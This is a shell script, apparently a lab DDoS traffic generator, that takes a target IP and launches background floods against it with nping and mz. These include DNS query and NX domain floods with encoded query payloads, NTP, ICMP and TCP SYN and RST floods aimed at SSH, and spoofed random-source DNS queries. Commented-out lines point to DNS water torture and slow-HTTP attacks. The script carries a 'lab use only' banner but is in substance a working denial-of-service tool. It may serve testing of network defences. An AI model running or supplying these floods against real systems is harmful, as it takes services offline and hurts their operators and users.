#!/bin/sh
# Christopher Gray
# Version 0.2.5
#  2/26/2020

if [ -z "$1" ]; then
      echo "No dest defined to attack! please define one before continuing \r\n"
      exit
else
      server_ip=$1
      echo "Server is set to $server_ip \r\n"
fi

if [ -z "$2" ]; then
      echo "Defaulting queries to send is set to: 1500 \r\n"
      queries_ps=1500
else
      queries_ps=$2
      #echo "port = $server_port \r\n"
fi

echo -e "

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMWXKXNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNXKXWMMMMMMMMMMMMMMM
MMMMMMMMMMMMKdc,,,:dKWMMMMMMMMMMMMMMMMMWNX0OkxxddddxxkkO0XNWMMMMMMMMMMMMMMMMMW0o:,,;cxXMMMMMMMMMMMMM
MMMMMMMMMMMK:.......:KMMMMMMMMMMMMWX0xoc;,'.............',:cox0NWMMMMMMMMMMMMO,.......lXMMMMMMMMMMMM
MMMMMMMMMMMO,.......'kMMMMMMMMMWXxl;..........................';lkXWMMMMMMMMWx........:KMMMMMMMMMMMM
MMMMMMMMW0dc'........lXMMMMMMW0l,.................................;o0WMMMMMMKc........,ldKWMMMMMMMMM
MMMMMMMNd'............ckNMMW0l'.....................................,oXMMWXk:............,kWMMMMMMMM
MMMMMMMK:..............'kWWk,.........................................;OWNd...............lXMMMMMMMM
MMMMMMMNo..............oNNd'...........................................,kWXc.............'xWMMMMMMMM
MMMMMMMMNkl;,,cok00OxcoKWk,.............................................;0M0llxO0Oxo:,,:lOWMMMMMMMMM
MMMMMMMMMMWNXXWMMMMMMWWWXc...............................................oNWWWMMMMMMWXXNMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMO,...............................................;0MMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMx'...............................................,OMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMx'...............................................,OMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMM0;...............................................cXMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMWk,.............................................;0MMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMWO;......',;,,'..................'',;;,'......c0WMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMKc...,dKXXXXK0kdl;........':oxO0KXXXX0o'..'lXMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMKc..lNMMMMMMMMMMNx,.....;kNMMMMMMMMMMXc..lXMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMWk'.:KMMMMMMMMMMMK:.....lNMMMMMMMMMMWO,.,OMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMWKKWMO,..:OWMMMMMMMMNx'.....,kWMMMMMMMMNk;..:KMWKXWMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMWN0O0XWMMMMWN0dc,dWMk'...'cx0XNNX0xc'.,ol;'.'lkKXNNX0xc'...,OMNo,cx0NMMMMMNKOOKNMMMMMMMMMMM
MMMMMMMMXd;'..,codxdl;'..'kMWd.......',;;,'...,kWNXd'...',;;,'......'xMWd...':ldxdl:,..':xXMMMMMMMMM
MMMMMMMNl................'kMWx...............'xWMWMNo...............,OMWd.................dWMMMMMMMM
MMMMMMMK:..............,lxXMMNkc;,''.........,ox666xo'.........'',;lONMWKxc'..............lNMMMMMMMM
MMMMMMMWO;...........'oKWMMMMMMWNXK0l........................'d0KXNWMMMMMMW0l'...........:0WMMMMMMMM
MMMMMMMMMXOo,........oWMMMMMMMMMMMMMO,.......................;0MMMMMMMMMMMMMNl........,oONMMMMMMMMMM
MMMMMMMMMMMO,.......'OMMMMMMMMMMMMMMK;..'co;...,ll:,...:o:...cXMMMMMMMMMMMMMMx........;0MMMMMMMMMMMM
MMMMMMMMMMMXl.......lXMMMMMMMMMMMMMMNl..cXMO;.'xWNKo'.:KM0:.'dWMMMMMMMMMMMMMMK:......'dNMMMMMMMMMMMM
MMMMMMMMMMMMNOoc:cokNMMMMMMMMMMMMMMMMN00XMMWK0KNMMMN00XWMWX0KNMMMMMMMMMMMMMMMMXxlc:coOWMMMMMMMMMMMMM
MMMMMMMMMMMMMMMWWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWWMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNMMMMMMMM



            ________  ________          _________              
            \______ \ \______ \   ____ /   _____/              
             |    |  \ |    |  \ /  _ \\_____  \               
             |    `   \|    `   (  <_> )        \              
            /_______  /_______  /\____/_______  /              
                    \/        \/              \/               
  ________                                   __                
 /  _____/  ____   ____   ________________ _/  |_  ___________ 
/   \  ____/ __ \ /    \_/ __ \_  __ \__  \\   __\/  _ \_  __ \
\    \_\  \  ___/|   |  \  ___/|  | \// __ \|  | (  <_> )  | \/
 \______  /\___  >___|  /\___  >__|  (____  /__|  \____/|__|   
        \/     \/     \/     \/           \/                   


            ONLY FOR LAB USE. DO NOT USE ON THE INTERWEBS!


"

echo "Running Legitmate Traffic... \r\n "
sudo ./gen_legit_dns_traffic.sh $server_ip $queries_ps &>/dev/null &

echo "Running UDP Floods... \r\n "
sudo ./gen_udp_floods.sh $server_ip  &>/dev/null &

#-----------------------------------------------------------------------------------------------------------------
RATE=5000
SAMPLES=1000000000
OUTPUT=&>/dev/null
NPING_SILENT='-HNq'
VALID_DNS_QUERY="000001000001000000000000037177650474657374036c61620000010001"
INEXISTENT_DNS_QUERY="0000000000010000000000000c6e6f73756368646f6d61696e08696e7465726e616c036c61620000010001"

echo "Performing a DNS query flood \r\n "
sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $VALID_DNS_QUERY  $OUTPUT 2> /dev/null &

echo "Performing a NX domain flood \r\n "
sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $INEXISTENT_DNS_QUERY $OUTPUT 2> /dev/null &

echo "Performing a NTP flood, from port NTP (Time Protocol) \r\n "
sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 $OUTPUT 2> /dev/null &

echo "Performing a TCP SYN Flood towards SSH \r\n"
sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags SYN -p 22 $OUTPUT 2> /dev/null &

echo "Performing a ICMP Flood \r\n "
sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --icmp $OUTPUT 2> /dev/null &

echo "Performing a RST Flood on TCP towards SSH \r\n "
sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 $OUTPUT 2> /dev/null &
#-----------------------------------------------------------------------------------------------------------------

mz -A rand -B $server_ip -t dns "q=badactor.com" -c 10000000 2> /dev/null &


#------ Attack traffic ----------
#echo "Running NX Domain attack python script... \r\n "
#sudo python attack_dns_nxdomain.py $server_ip example.com 10000 &>/dev/null &
#echo "Running DNS Water Torture attack against server"
#sudo ./attack_dns_watertorture_wget.sh $server_ip  &>/dev/null &

#--- web attacks -----
#echo "Performing a Slow HTTP Test script against webserver \r\n "
#sudo ./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://$server_ip/resources/loginform.html -x 10 -p 3 2> /dev/null &
#sudo ./gen_ab.sh $server_ip/index.html &>/dev/null &

echo "DONE \r\n \r\n"
